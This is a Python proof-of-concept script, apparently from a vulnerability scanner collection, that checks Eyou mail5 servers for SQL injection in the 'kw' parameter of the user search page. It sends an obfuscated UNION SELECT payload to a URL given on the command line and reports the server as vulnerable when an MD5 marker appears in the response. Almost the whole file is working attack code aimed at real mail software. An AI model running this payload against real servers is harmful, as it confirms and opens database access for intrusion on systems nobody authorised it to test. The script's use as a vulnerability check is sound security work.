#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 亿邮mail5 user 参数kw SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-074260
author: Lucifer
description: 文件user中,参数kw存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class eyou_user_kw_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/user/?q=help&type=search&page=1&kw=-1%22)UnIoN/**/AlL/**/SeLeCt/**/1,2,3,Md5(1234),5,6,7%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在亿邮mail5 user 参数kw SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True,vulnurl,"亿邮mail5 user 参数kw SQL注入",payload,req.text
            else:
                cprint("[-]不存在eyou_user_kw_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = eyou_user_kw_sqli_BaseVerify(sys.argv[1])
    testVuln.run()